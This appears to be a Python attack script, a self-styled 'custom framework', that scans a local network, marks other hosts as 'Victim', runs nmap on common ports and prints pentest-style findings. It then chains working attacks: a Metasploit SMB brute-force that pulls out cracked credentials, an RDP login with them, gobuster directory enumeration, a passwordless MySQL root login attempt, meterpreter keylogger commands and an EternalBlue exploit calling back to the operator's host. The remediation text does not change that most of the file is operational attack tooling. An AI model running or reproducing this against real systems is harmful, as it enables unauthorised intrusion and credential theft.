import pyfiglet
from colorama import init, Fore, Style
import shutil

# تفعيل دعم الألوان
init()

# --- إعدادات النص والألوان ---
FONT_STYLE = "slant" 
RED_COLOR = Fore.RED      # لون "THE" والخط العلوي
BLUE_COLOR = Fore.BLUE    # لون "POWER" والخط السفلي
WHITE_COLOR = Fore.WHITE  # لون محايد للمسافات

# 1. توليد النص "THE" و "POWER"
ascii_the = pyfiglet.figlet_format("THE", font=FONT_STYLE)
the_lines = [RED_COLOR + line.rstrip() + Style.RESET_ALL for line in ascii_the.split('\n')]

ascii_power = pyfiglet.figlet_format("POWER", font=FONT_STYLE)
power_lines = [BLUE_COLOR + line.lstrip() + Style.RESET_ALL for line in ascii_power.split('\n')]

# 2. دمج الكلمات
final_banner_lines = []
max_height = max(len(the_lines), len(power_lines))

# موازنة ارتفاع الكلمات
while len(the_lines) < max_height:
    the_lines.append("")
while len(power_lines) < max_height:
    power_lines.append("")

# الفاصل الآن هو مسافة بيضاء بسيطة
SEPARATOR_SPACE = "   " 

for i in range(max_height):
    the_part = the_lines[i]
    power_part = power_lines[i]
    
    # دمج الكلمتين في سطر واحد
    combined_line = f"{the_part.rstrip()}{SEPARATOR_SPACE}{power_part.lstrip()}"
    final_banner_lines.append(combined_line)

# حساب عرض الشعار المدمج للتوسيط
try:
    terminal_width = shutil.get_terminal_size().columns
except:
    terminal_width = 80

# 3. طباعة الشعار النهائي
print("\n")

# الخط الفاصل العلوي باللون الأحمر
TOP_FRAME = RED_COLOR + "═" * 60 + Style.RESET_ALL
print(TOP_FRAME.center(terminal_width))

for line in final_banner_lines:
    print(line.center(terminal_width))

# الخط الفاصل السفلي باللون الأزرق
BOTTOM_FRAME = BLUE_COLOR + "═" * 60 + Style.RESET_ALL
print(BOTTOM_FRAME.center(terminal_width))

# print("\n")










banner = """
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
|                                         CUSTOM FRAMEWORK by SHAMS SAMARA                                   |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+|
|                                                                                                             |
|   EXPLOIT (BOW)                                      PAYLOAD (ARROW)                                        |
|        \033[93m(\033[0m                                                    _                                               |
|         \033[93m\\\033[0m                                               .-'` |\033[95m___________________________//////\033[0m             |
|          \033[93m)\033[0m                                              `'-._|                           \033[95m\\\\\\\\\\\\  \033[0m           |
|        \033[95m##-------->\033[0m                                                                                          |
|          \033[93m)\033[0m                                                                                                  |
|         \033[93m/\033[0m                                                                                                   |
|        \033[93m(\033[0m                                                                                                    |
|                                                                                                             |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
|                                                                                                             |
|   VULNERABLE (TARGET)                           PRIVILEGE ESCALATION (SWORD)                                |
|                                                                                                             |
| \033[91m.:::::..\033[0m                                                   \033[94m/ \\\033[0m                                              |
| \033[91m.-###########-.            ..*\033[0m                            \033[94m{   }\033[0m                                             |
| \033[91m=%%%%#=:....=*%%*.         .**%-\033[0m                          \033[94mp   !\033[0m                                             |
| \033[91m.#@%%*:  .:::.   *%%:      .-++*+.\033[0m                        \033[94m; : ;\033[0m                                             |
| \033[91m.#@%#= .=%%%%%%%+. .#%:  .-+-\033[0m                             \033[94m| : |\033[0m                                             |
| \033[91m*@%%= :#%*=:.:=*%%- :%#-=-\033[0m                                \033[94m| : |\033[0m                                             |
| \033[91m=%%%+ :%%=..:-:. =%%-:+%+\033[0m                                 \033[94ml ; l\033[0m                                             |
| \033[91m*@%%: *%+ .+%%%*--+%%..%*.\033[0m                                \033[94ml ; l\033[0m                                             |
| \033[91m.*@%%. %%: =%%%%%#=.%%..*#:\033[0m                               \033[94mI ; I\033[0m                                             |
| \033[91m.*@%%. %%- -%%%@%+. %%..##:\033[0m                               \033[94mI ; I\033[0m                                             |
| \033[91m*@%%: *%* .+%%%#: +%% .%*.\033[0m                                \033[94mI ; I\033[0m                                             |
| \033[91m=%%%* .%%+  .... =%%: =%*\033[0m                                 \033[94mI ; I\033[0m                                             |
| \033[91m *@%%- .%%#=.  -#%%- .%#.\033[0m                                 \033[94md | b\033[0m                                             |
| \033[91m .#@%%-  =%%%%%%%*. .%%-\033[0m                                  \033[94mH | H\033[0m                                             |
| \033[91m  .*%%%#.. .-==. ..*@#:\033[0m                                   \033[94mH | H\033[0m                                             |
| \033[91m    +@%%%#-:::::-#%%*\033[0m                                     \033[94mH I H\033[0m                                             |
| \033[91m    :%#***%@%%#***%#-\033[0m                               ,;,   \033[94mH I H\033[0m   ,;,                                       |
| \033[91m    *#+  :#%*-:.  *#*.\033[0m                             ;H@H;  \033[94m;_H_;,\033[0m ;H@H;                                      |
| \033[91m   =#*:  :%#-     :%*=\033[0m                           `\Y/d_,;|4H@HK|;,_b\Y/'                                    |
| \033[91m  :#*=   =%+:      =%*-\033[0m                           '\;MMMMM$@@@$MMMMM;/'                                     |
| \033[91m  ***.  .%#=        ##+.\033[0m                           "~~~*;!8@8!;*~~~"                                        |
| \033[91m =#*:   :%*=        .%*=\033[0m                                  ;888;                                             |
| \033[91m.**+    +%+:         +%+.\033[0m                                 ;888;                                             |
| \033[91m+#*.    *#=          .#*=\033[0m                                 ;888;                                             |
| \033[91m.++-                   -*=:\033[0m                               ;888;                                             |
| \033[91m ..\033[0m                                                       d8@8b                                             |
|                                                           O8@8O                                             |
|                                                           T808T                                             |
|                                                            `~`                                                             


                                               |
                                               |
                                               |
                                               |
                                               |
                                               | ATTACK
                                               |
                                               |
                                               |
                                               V






    (   .     .  .=##                      ]-I-I-I-[                    /
  .=##   .  (      ( .                     \ `  ' /        \\' ,      / //
    ( .   .=##  .       .                   |'  []          \\//    _/ //' 
  .     .   ( .    .        _----|          |.  '|           \_-//' /  //<' 
                             ----|_----|    | ' .|             \ ///  <//' 
    _ _ _ _ _ _      _----|      | ----|    | [] |             /  >>   \\` 
    ]-I-I-I-I-[       ----|      |     |    |. ` |            /,)-^>>  _\` 
     \ `   '_/            |     / \    |    | /^\|            (/   \\ / \\ 
      []  `__|            ^    / ^ \   ^    | |*||                  //  //\\ 
      |__   ,|           / \  / ^ ^`\ / \   | ===|                 ((` 
   ___| ___ ,|__        / ^  /=_=_=_=\ ^ \  |, `_| 
   I_I__I_I__I_I       (====(_________)_^___|____|____ 
   \-\--|-|--/-/       |     I  [ ]__I I_I__|____I_I_| 
    |[] `    '|__   _  |_   _|`__  ._[  _-\--|-|--/-/ 
   / \  [] ` .|  |-| |-| |-| |_| |_| |_| | []   [] | 
  <===>    `  |.            .      .     |    '    | 
  ] []|  `    |   []    --   []      `   |   [] '  | 
  <===>.  `   |  .   '  .       '  .[]   | '       | 
   \_/    .   |       .       '          |   `  [] | 
    | []    . |   .  .           ,  .    | ,    .  | 
    |    . '  |       . []  '            |    []'  | 
   / \   ..   |  `      .    .     `[]   | -   `   | 
  <===>      .|=-=-=-=-=-=-=-=-=-=-=-=-=-|    .   / \ 
  ] []|` ` [] |`  .  .   _________   .   |-      <===> 
  <===>  `  ' | '   |||  |       |  |||  |  []   <===> 
   \_/     -- |   . |||  |       |  |||  | .  '   \_/ 
  ./|' . . . .|. . .||||/|_______|\|||| /|. . . . .|\_  |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
"""
print(banner)
































# banner = r"""
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# |                                         CUSTOM FRAMEWORK by SHAMS SAMARA                                    |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+|
# |                                                                                                             |
# |   EXPLOIT (BOW)                                      PAYLOAD (ARROW)                                        |
# |        (                                                    _                                               |
# |         \                                               .-'` |___________________________//////             |
# |          )                                              `'-._|                           \\\\\\             |
# |        ##-------->                                                                                          |
# |          )                                                                                                  |
# |         /                                                                                                   |
# |        (                                                                                                    |
# |                                                                                                             |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# |                                                                                                             |
# |   VULNERABLE (TARGET)                           PRIVILEGE ESCALATION (SWORD)                                |
# |                                                                                                             |
# | .:::::..                                                  / \                                               |
# | .-###########-.            ..*                           {   }                                              |
# | =%%%%#=:....=*%%*.         .**%-                         p   !                                              |
# |.#@%%*:  .:::.   *%%:      .-++*+.                        ; : ;                                              |
# |.#@%#= .=%%%%%%%+. .#%:  .-+-                             | : |                                              |
# |*@%%= :#%*=:.:=*%%- :%#-=-                                | : |                                              |
# |=%%%+ :%%=..:-:. =%%-:+%+                                 l ; l                                              |
# |*@%%: *%+ .+%%%*--+%%..%*.                                l ; l                                              |
# |.*@%%. %%: =%%%%%#=.%%..*#:                               I ; I                                              |
# |.*@%%. %%- -%%%@%+. %%..##:                               I ; I                                              |
# |*@%%: *%* .+%%%#: +%% .%*.                                I ; I                                              |
# |=%%%* .%%+  .... =%%: =%*                                 I ; I                                              |
# | *@%%- .%%#=.  -#%%- .%#.                                 d | b                                              |
# | .#@%%-  =%%%%%%%*. .%%-                                  H | H                                              |
# |  .*%%%#.. .-==. ..*@#:                                   H | H                                              |
# |    +@%%%#-:::::-#%%*                                     H I H                                              |
# |    :%#***%@%%#***%#-                               ,;,   H I H   ,;,                                        |
# |    *#+  :#%*-:.  *#*.                             ;H@H;  ;_H_;, ;H@H;                                       |
# |   =#*:  :%#-     :%*=                           `\Y/d_,;|4H@HK|;,_b\Y/'                                     |
# |  :#*=   =%+:      =%*-                           '\;MMMMM$@@@$MMMMM;/'                                      |
# |  ***.  .%#=        ##+.                           "~~~*;!8@8!;*~~~"                                         |
# | =#*:   :%*=        .%*=                                  ;888;                                              |
# |.**+    +%+:         +%+.                                 ;888;                                              |
# |+#*.    *#=          .#*=                                 ;888;                                              |
# |.++-                   -*=:                               ;888;                                              |
# | ..                                                       d8@8b                                              |
# |                                                          O8@8O                                              |
# |                                                          T808T                                              |
# |                                                           `~`                                               |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# """
# print(banner)




























# "Created By {Fore.RED}SHAMS{Style.RESET_ALL} {Fore.CYAN}SAMARA{Style.RESET_ALL}"



# from colorama import Fore, Style
# import shutil

# terminal_width = shutil.get_terminal_size().columns

# signature_text = Fore.WHITE + Style.BRIGHT +"""
#    ____                _           _   _                                        
#   / ___|_ __ ___  __ _| |_ ___  __| | | |__  _   _                              
#  | |   | '__/ _ \/ _` | __/ _ \/ _` | | '_ \| | | |                             
#  | |___| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |                             
#   \____|_|  \___|\__,_|\__\___|\__,_| |_.__/ \__, |                             
#   ____  _   _    _    __  __ ____    ____    |___/__  __    _    ____      _    
#  / ___|| | | |  / \  |  \/  / ___|  / ___|  / \  |  \/  |  / \  |  _ \    / \   
#  \___ \| |_| | / _ \ | |\/| \___ \  \___ \ / _ \ | |\/| | / _ \ | |_) |  / _ \  
#   ___) |  _  |/ ___ \| |  | |___) |  ___) / ___ \| |  | |/ ___ \|  _ <  / ___ \ 
#  |____/|_| |_/_/   \_\_|  |_|____/  |____/_/   \_\_|  |_/_/   \_\_| \_\/_/   \_                                                                                                                                                                                            
# """+ Style.RESET_ALL

# print(signature_text.center(terminal_width))

# print("\n")




















import subprocess

def get_ip_address():
    # تنفيذ أمر ifconfig مع grep لاستخراج عناوين الـ IP
    result = subprocess.run(
        "ifconfig | grep -oP 'inet\\s+\\K[0-9.]+'",
        shell=True,
        capture_output=True,
        text=True
    )

    # نخزن الـ output ونختار أول IP غير 127.0.0.1
    lines = result.stdout.strip().split('\n')
    ips = [ip for ip in lines if ip != "127.0.0.1"]

    if ips:
        return ips[0]  # أول IP حقيقي
    else:
        return None
LHOST = get_ip_address()
def ask_and_show_ip():
    answer = input("\033[92mWould you like to know your IP address? (y/n): \033[0m").strip().lower()


    if answer in ("y", "yes"):
        ip = get_ip_address()
        if ip:
            print(f"\033[93mYour IP address is:\033[0m \033[92m{ip}\033[0m")
        else:
            print("Could not detect your IP address.")
    else:
        print("Okay, not showing the IP address.")

if __name__ == "__main__":
    ask_and_show_ip()



import subprocess

# Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

MY_IP = "192.168.1.192"   

def get_devices():
    result = subprocess.run(
        "fping -a -g 192.168.1.0/24 2>/dev/null",
        shell=True,
        capture_output=True,
        text=True
    )
    devices = result.stdout.strip().split('\n')
    return [d for d in devices if d]

def ask_and_show_devices():
    answer = input("\033[95mWould you like to know the devices on your network? (y/n): \033[0m").strip().lower()

    if answer in ("y", "yes"):
        devices = get_devices()
        if devices:
            print(f"{CYAN}Devices found on your network:{RESET}")
            for d in devices:
                if d == MY_IP:
                    print(f"{GREEN}- {d}  (Your device){RESET}")
                else:
                    print(f"{YELLOW}- {d}  (Victim){RESET}")
        else:
            print("No devices detected.")
    else:
        print("Okay, not scanning the network.")

if __name__ == "__main__":
    ask_and_show_devices()


import subprocess
import shutil

# Target IP
target = input("\033[96mEnter your IP to scan: \033[0m")
print(f"You entered: {target}")

TARGET_IP = target



nmap_output = ""  # افتراضياً فارغة

# def is_port_open(port):
#     return f"{port}/tcp open" in nmap_output


def is_port_open(port):
    for line in nmap_output.splitlines():
        if line.startswith(f"{port}/tcp") and "open" in line:
            return True
    return False




nmap_xml = "scan.xml"
# Check if nmap is installed
if shutil.which("nmap") is None:
    print("❌ nmap is not installed. Please run: sudo apt install nmap")
else:
    try:
        print(f"🚀 Starting scan on: {target}\n")

        # Run nmap with proper arguments
        result = subprocess.run([
            "nmap",
            "-A",
            "-sV",
            "--version-intensity", "9",
            "-O",
            "--osscan-guess",
            "-sC",
            "-T5",
            "-vv",
            "-p", "21,445,3306,3389,80",
             "-oX",nmap_xml,
            target
        ], capture_output=True, text=True, timeout=300)

        # Print the full output exactly like nmap
        print(result.stdout)
        nmap_output = result.stdout

       

    



        

    except subprocess.TimeoutExpired:
        print("⏱️ Scan exceeded the allotted time.")
    except Exception as e:
        print(f"⚠️ Error running nmap: {e}")



import xml.etree.ElementTree as ET

def parse_nmap_os(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    ports_info = {}
    os_detected = None

    # محاولة الحصول على أفضل OS
    os_match = root.find("host/os/osmatch")
    if os_match is not None:
        os_detected = os_match.attrib.get("name")

    # لكل منفذ
    for port in root.findall("host/ports/port"):
        portid = port.attrib.get("portid")
        service_elem = port.find("service")
        service_name = service_elem.attrib.get("name") if service_elem is not None else "unknown"

        ports_info[portid] = {
            "service": service_name,
            "os": os_detected  # يمكن تخصيص لكل منفذ إذا وجد OS لكل service
        }
    return ports_info









services = parse_nmap_os(nmap_xml)





import os
import xml.etree.ElementTree as ET

services = {}

tree = ET.parse("scan.xml")
root = tree.getroot()

# استخراج نظام التشغيل
os_name = "Unknown"
os_elem = root.find(".//osmatch")
if os_elem is not None:
    os_name = os_elem.attrib.get("name", "Unknown")

for port in root.findall(".//port"):
    portid = port.attrib["portid"]
    state = port.find("state").attrib["state"]

    if state != "open":
        continue

    service_elem = port.find("service")
    service_name = service_elem.attrib.get("name", "unknown")
    product = service_elem.attrib.get("product", "")
    version = service_elem.attrib.get("version", "")
    extrainfo = service_elem.attrib.get("extrainfo", "")

    full_version = " ".join(filter(None, [product, version, extrainfo]))

    services[portid] = {
        "service": service_name,
        "version": full_version if full_version else "Unknown",
        "os": os_name
    }



if is_port_open(21):
 if "21" in services:
  
  info = services["21"]        
  print("\033[92m[*]\033\033[92mFTP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt is possible to exploit it:\nWARNING This service is an outdated version and can be exploited in the following ways:\nthat allows unrestricted brute-force attacks\033[0m⚡️⚡️")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – FTP Service Exposure (Port 21)\n"
      "Finding ID: PT-FTP-001\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      f"Port: 21/TCP (Open)\033[0m\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution FTP: Update or remove the service if you no longer need it.\n\n"
      "Disable FTP entirely if not required, or replace it with SFTP/FTPS.\n\n"
      "Block port 21 on the firewall except for authorized internal IPs.\n\n"
      "Disable anonymous login and enforce strong authentication.\n\n"
      "Enable logging and harden FTP settings through IIS or the FTP service configuration.\033[0m")





if is_port_open(445):
 if "445" in services:
  info = services["445"]
  print("\033[92m[*]\033\033[92mSMB\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt how to exploit:You can exploit it using a known vulnerability in this service called EternalBlueexploit in msfconsole is:exploit/windows/smb/ms17_010_eternalblue \033[0m⚡️⚡️")
  print()
  print("\033[93mnote: you can execute a brute force attack in smb_login\n"
      "use this module: auxiliary/scanner/smb/smb_login\033[0m")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – SMB Service Exposure (Port 445)\n"
      "Finding ID: PT-SMB-002\n"
      "Severity: Critical\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 445/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Upgrade or replace Windows Server 2008 R2 (End-of-life) with a supported version.\n\n"
      "Disable SMBv1 and restrict port 445 to internal trusted IPs only.\n\n"
      "Enable SMB Signing and disable guest/anonymous access.\n\n"
      "Implement firewall rules and monitor SMB logs for suspicious activity.\033[0m")






if is_port_open(3306):
 if "3306" in services:
  info = services["3306"]
  print("\033[92m[*]\033\033[92mMYSQL\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt how to exploit: You can exploit login in root username No password\n\n"
      "Brute Force login\n\n"
      "Enumerate users\n\n"
      "Exploiting vulnerabilities\n\n"
      "Dumping databases\n\n"
      "add & delete database\033[0m⚡️⚡️")
  print()

  print("🛡️🛡️  \033[94mPenetration Testing Report – MySQL Service Exposure (Port 3306)\n"
      "Finding ID: PT-MYSQL-003\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 3306/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Upgrade MySQL from the outdated 5.5.20 version to a supported version such as MySQL 8.0.\n\n"
      "Restrict port 3306 using a firewall so it’s only accessible from localhost or specific trusted IPs.\n\n"
      "Enforce strong passwords and disable remote root login.\n\n"
      "Enable logging and remove any unnecessary accounts or privileges.\033[0m")














if is_port_open(3389):
 if "3389" in services:
  info = services["3389"] 
  print("\033[92m[*]\033\033[92mRDP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt you can exploit it: rdesktop -u ***** -p ***** <Target>""\033[0m⚡️⚡️")
  print()

  print("🛡️🛡️  \033[94mPenetration Testing Report – RDP Service Exposure (Port 3389)\n"
      "Finding ID: PT-RDP-004\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 3389/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Restrict RDP access using a firewall so only specific trusted IPs can connect.\n\n"
      "Enable Network Level Authentication (NLA) and enforce strong passwords + account lockout policies.\n\n"
      "Update the OS (Windows 7/2008 R2/Vista) to a supported version due to known RDP vulnerabilities.\n\n"
      "Enable RDP encryption, disable weak ciphers, and consider enabling 2FA for remote access.\033[0m")







if is_port_open(80):
 if "80" in services:
  
  info = services["80"]        
  print("\033[92m[*]\033\033[92mHTTP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt this is the best Position to information gathering:\nWARNING This service is an outdated version and can be exploited in the following ways:\033[0m⚡️⚡️")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – HTTP Service Exposure (Port 80)\n"
      "Finding ID: PT-HTTP-005\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      f"Port: 80/TCP (Open)\033[0m\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution HTTP: Update or remove the service if you no longer need it.\n\n"
      "Disable HTTP entirely if not required, or replace it with https for secure information such as login page.\033[0m")












# import subprocess
# import tempfile

# choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()

# if choice == "yes" or "y":
#     print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")

    
#     msf_script = f"""
# setg LHOST {LHOST}
# setg RHOSTS {TARGET_IP}
# use auxiliary/scanner/smb/smb_login
# set user_file /home/shams/Desktop/project/users.txt
# set pass_file /home/shams/Desktop/project/password.txt
# set stop_on_success true
# set verbose true
# run
# exit
# """

#     with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
#         f.write(msf_script)
#         script_path = f.name

   
#     #subprocess.run(["msfconsole", "-q", "-r", script_path])
#     result = subprocess.run(
#     ["msfconsole", "-q", "-r", script_path],
#     capture_output=True,
#     text=True
# )
# import re

# full_output = result.stdout + result.stderr
# FOUND_CREDS = None

# for line in full_output.splitlines():
#     if "Success:" in line:
#         FOUND_CREDS = line
#         break

# if FOUND_CREDS:
#     print("\033[92m[+] Successful credentials found!\033[0m")
#     print(f"\033[94m[*] Raw Line:\033[0m {FOUND_CREDS}")

#     match = re.search(r"Success:\s+'([^:]+):([^']+)'", FOUND_CREDS)
#     if match:
#         USERNAME = match.group(1)
#         PASSWORD = match.group(2)


#         USERNAME= USERNAME.split("\\")[-1]

#         print(f"\033[93mUsername:\033[0m {USERNAME}")
#         print(f"\033[93mPassword:\033[0m {PASSWORD}")
#     else:
#      print("\033[91m[-] No valid credentials found.\033[0m")


# else:
#     print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")











import subprocess
import tempfile
import re

# الملفات الافتراضية
default_user_file = "/home/shams/Desktop/project/users.txt"
default_pass_file = "/home/shams/Desktop/project/password.txt"

choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()

if choice in ["yes", "y"]:
    print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")
    
    # نسأل المستخدم عن مسار الملفات مع افتراضيات
    user_file = input(f"\033[93mEnter the full path to the users file [{default_user_file}]: \033[0m").strip()
    pass_file = input(f"\033[93mEnter the full path to the passwords file [{default_pass_file}]: \033[0m").strip()

    # إذا لم يدخل المستخدم شيء، نستخدم المسارات الافتراضية
    if not user_file:
        user_file = default_user_file
    if not pass_file:
        pass_file = default_pass_file

    msf_script = f"""
setg LHOST {LHOST}
setg RHOSTS {TARGET_IP}
use auxiliary/scanner/smb/smb_login
set user_file {user_file}
set pass_file {pass_file}
set stop_on_success true
set verbose true
run
exit
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write(msf_script)
        script_path = f.name

    result = subprocess.run(
        ["msfconsole", "-q", "-r", script_path],
        capture_output=True,
        text=True
    )

    full_output = result.stdout + result.stderr
    FOUND_CREDS = None

    for line in full_output.splitlines():
        if "Success:" in line:
            FOUND_CREDS = line
            break

    if FOUND_CREDS:
        print("\033[92m[+] Successful credentials found!\033[0m")
        print(f"\033[94m[*] Raw Line:\033[0m {FOUND_CREDS}")

        match = re.search(r"Success:\s+'([^:]+):([^']+)'", FOUND_CREDS)
        if match:
            USERNAME = match.group(1).split("\\")[-1]
            PASSWORD = match.group(2)

            print(f"\033[93mUsername:\033[0m {USERNAME}")
            print(f"\033[93mPassword:\033[0m {PASSWORD}")
        else:
            print("\033[91m[-] No valid credentials found.\033[0m")
else:
    print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")









import os

print("\033[92m[*] We have successfully obtained the username and password.\033[0m")
print("\033[92m[*] Now we will attempt RDP login using rdesktop.\033[0m")

choice = input("\033[94m[?] Do you want to proceed with the RDP login attempt?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()

if choice == "y":
    print("\033[92m[*] Executing RDP command...\033[0m")
    os.system(f"rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}")
else:
    print("\033[91m[!] RDP login attempt canceled.\033[0m")














# import subprocess

# cyan = "\033[96m"
# green = "\033[92m"
# red = "\033[91m"
# reset = "\033[0m"

# print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
# choice = input("> ").strip().lower()

# if choice in ["yes", "y"]:
#     print("Running the command...")
    
 
#     command = [
#         "gobuster",
#         "dir",
#         "-u", f"http://{TARGET_IP}/",
#         "--wordlist", "/usr/share/wordlists/dirb/common.txt"
#     ]

#     try:
#         subprocess.run(command)
#     except FileNotFoundError:
#         print("The command could not be executed. Make sure Gobuster is installed.")
# else:
#     print("Operation cancelled.")











import subprocess

cyan = "\033[96m"
green = "\033[92m"
red = "\033[91m"
reset = "\033[0m"

DEFAULT_WORDLIST = "/usr/share/wordlists/dirb/common.txt"

print(f"{cyan}Do you want me to run the directory scanning command? ({green}yes{reset}/{red}no{reset}){reset}")
choice = input("> ").strip().lower()

if choice in ["yes", "y"]:

    # Ask user for wordlist path
    wordlist = input(
        f"{cyan}Enter wordlist path [default: {DEFAULT_WORDLIST}]: {reset}"
    ).strip()

    # Use default if empty
    if not wordlist:
        wordlist = DEFAULT_WORDLIST

    print("Running the command...")

    command = [
        "gobuster",
        "dir",
        "-u", f"http://{TARGET_IP}/",
        "--wordlist", wordlist
    ]

    try:
        subprocess.run(command)
    except FileNotFoundError:
        print(f"{red}The command could not be executed. Make sure Gobuster is installed.{reset}")
else:
    print("Operation cancelled.")

















import subprocess

def try_mysql_login():
    answer = input("\033[93mWould you like to connecting to the database server bypass exploit?\033[0m (\033[92my\033[0m/\033[91mn\033[0m): ").strip().lower()

    if answer in ("y", "yes"):
        print("Running MySQL connection command...")
        subprocess.run([
    "mysql",
    "-u", "root",
    "-p",
    "-h", TARGET_IP,
    "--skip-ssl"
                       ])
        # subprocess.run(
        #     f"mysql -u root -p -h {TARGET_IP} --skip-ssl",
        #     shell=True
        # )
    else:
        print("Skipping database connection test.")
try_mysql_login()







print(
    "\033[93mNote: if you need use a keylogger in meterpreter use this command:\033[0m\n"
    "\033[92mkeyscan_start\033[0m\n"
    "\033[94mkeyscan_dump\033[0m\n"
    "\033[91mkeyscan_stop\033[0m"
)




import subprocess
import tempfile

choice = input("\n\033[93mDo you want to exploit SMB eternalblue exploit using Metasploit? (yes/no): \033[0m").strip().lower()

if choice == "yes":
    print("\n\033[91m[!] Launching Metasploit... executing SMB exploit module...\033[0m\n")

   
    msf_script = f"""
setg LHOST {LHOST}
setg RHOSTS {TARGET_IP}
use exploit/windows/smb/ms17_010_eternalblue

exploit
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
        f.write(msf_script)
        script_path = f.name

    
    subprocess.run(["msfconsole", "-q", "-r", script_path])

else:
    print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")







